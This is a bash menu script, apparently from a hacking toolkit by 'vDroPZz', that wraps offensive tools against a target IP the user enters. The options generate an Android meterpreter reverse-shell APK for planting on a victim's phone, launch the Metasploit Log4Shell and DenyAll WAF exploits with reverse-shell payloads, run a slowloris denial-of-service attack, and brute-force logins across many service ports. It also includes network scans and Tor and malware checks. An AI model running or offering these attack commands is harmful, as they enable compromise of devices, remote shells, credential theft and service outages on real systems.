3#!/bin/bash
clear

# COLORS

blue='\033[94m'
red='\033[91m'
green='\033[92m'
orange='\033[93m'
reset='\e[0m'
magenta='\u001b[35m'
yellow='\u001b[33m'

# DEVELOPER

clear
    sleep 1.0
echo -e "$red[$reset$blue*$reset$red]$reset$yellow Coded by:$reset$magenta"
figlet -f big "vDroPZz"
    sleep 1.0
        clear
echo -e "$red[$reset$blue*$reset$red]$reset$yellow Contacts:$reset$magenta"
figlet -f small "GitHub:"
figlet -f big "DroPZsec"
echo -e $reset
    sleep 1.0
echo -e "$red[$reset$blue*$reset$red]$reset$green Contact me there if you have a question!$reset"
    sleep 2.0
clear

# CODE

sleep 1.0
echo -e "$orange###########################"
echo -e "#                         #"
echo -e "#  $reset$blue --[OTHER USEFULLS]-- $reset$orange #"
echo -e "#     $reset$blue by vDroPZz    $reset$orange     #"
echo -e "#                         #"
echo -e "###########################$reset"
    sleep 1.0
echo ""
echo ""
echo -e "$magenta"
figlet -f small DIFFERENT HACK MENU
    sleep 1.0
echo ""
echo ""
echo -e "$reset"
    sleep 1.0
echo ""
echo ""
echo -e "$red[$reset$blue 01 $reset$red]$reset$green ANDROID PAYLOAD CREATOR$reset"
    sleep 0.5
echo -e "$red[$reset$blue 02 $reset$red]$reset$green LOG4SHELL$reset"
    sleep 0.5
echo -e "$red[$reset$blue 03 $reset$red]$reset$green NMAP-DoS-ATTACK$reset"
    sleep 0.5
echo -e "$red[$reset$blue 04 $reset$red]$reset$green LOCAL NETWORK DEVICES SCAN$reset"
    sleep 0.5
echo -e "$red[$reset$blue 05 $reset$red]$reset$green LOCAL NETWORK DEVICES INTENSIVE SCAN$reset"
    sleep 0.5
echo -e "$red[$reset$blue 06 $reset$red]$reset$green WAF-DETECTION$reset"
    sleep 0.5
echo -e "$red[$reset$blue 07 $reset$red]$reset$green BRUTEFORCE ALL DANGER PORTS$reset"
    sleep 0.5
echo -e "$red[$reset$blue 08 $reset$red]$reset$green TOR NODE CHECKER$reset"
    sleep 0.5
echo -e "$red[$reset$blue 09 $reset$red]$reset$green MALWARE CHECK$reset"
    sleep 0.5
echo -e "$red[$reset$blue 00 $reset$red]$reset$green BACK$reset"
    sleep 0.5
echo ""
echo ""
echo ""
echo ""
echo -e "$green Your choice: $reset"
    read option;

if [ $option == 1 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    msfpayload -p android/meterpreter/reverse_tcp LHOST=eth0 LPORT=8080 -o ZinG.apk
    echo -e "$green Press ENTER if the ZinG.apk is installed on the target android-phone: $reset"
        read;
    msfconsole -q -x " use multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST eth0; run; exit; exit; "
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi

if [ $option == 2 ]; then
    echo -e "$green Enter Taregt IP or Website: $reset"
        read target;
    echo -e "$green Enter Target Port$reset $blue[80forHTTP,443forHTTPS]: $reset"
        read port;
    echo -e "$green Enter your own network-gateways$reset $blue[x.x.x.x]: $reset"
        read routerip;
    sudo msfconsole -q -x " use auxiliary/scanner/http/log4shell_scanner; set RHOSTS $target; set RPORT $port; set SRVHOST $routerip; set http_header USERAGENT; run; exit; exit; "
    sudo msfconsole -q -x " use exploit/multi/http/log4shell_header_injection; set payload java/shell_reverse_tcp; set RHOSTS $target; set RPORT $port; set LHOST eth0; set SRVHOST $routerip; set forceexploit true; run; exit; exit; "
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi

if [ $option == 3 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    echo -e "$green Enter Target Port$reset $blue[80forHTTP,443forHTTPS]: $reset"
        read port;
    nmap -p $port -sV $ip --script http-slowloris --max-parallelism 400 -d
    echo ""
    echo ""
    echo ""
    echo -e "$green Press Enter to continue... $reset"
        read;
fi

if [ $option == 4 ]; then
    echo -e "$green Enter your router-ip$reset $blue[192.168.x.1]: $reset"
        read ip;
    nmap $ip-254
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi

if [ $option == 5 ]; then
    echo -e "$green Enter your router-ip$reset $blue[192.168.x.1]: $reset"
        read ip;
    sudo nmap -Pn -sV -O $ip-254 --traceroute
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi

if [ $option == 6 ]; then
    echo -e "$green Enter Target IP or Website: $reset"
        read ip;
    nmap $ip --script http-waf-detect --script-args="http-waf-detect.aggro,http-waf-detect.uri=/testphp.vulnweb.com/artists.php"
    nmap $ip --script=http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1
    sudo msfconsole -q -x " use exploit/linux/http/denyall_waf_exec; set payload python/meterpreter/reverse_tcp; set RHOSTS $ip; set LHOST eth0; set forceexploit true; run; exit; exit; "
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi

if [ $option == 7 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    sudo brutex $ip 21
    sudo brutex $ip 22
    sudo brutex $ip 23
    sudo brutex $ip 24
    sudo brutex $ip 53
    sudo brutex $ip 80
    sudo brutex $ip 135
    sudo brutex $ip 137
    sudo brutex $ip 139
    sudo brutex $ip 442
    sudo brutex $ip 443
    sudo brutex $ip 445
    sudo brutex $ip 1107
    sudo brutex $ip 3306
    sudo brutex $ip 33089
    sudo brutex $ip 4444
    sudo brutex $ip 9050
    sudo brutex $ip 9150
    sudo brutex $ip
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi

if [ $option == 8 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    nmap $ip --script=tor-consensus-checker.nse
    nmap -Pn $ip --script=tor-consensus-checker.nse
    nmap -p 9050,9150 $ip --script=tor-consensus-checker.nse
    nmap -p 9050,9150  -Pn $ip --script=tor-consensus-checker.nse
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi

if [ $option == 9 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    nmap -Pn -sV $ip --script=http-malware-host.nse
    nmap -Pn -sV $ip --script=http-google-malware.nse
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read;
fi

if [ $option == 0 ]; then
    cd ..
    ./bashtomation.sh
fi

./other.sh
/bin/bash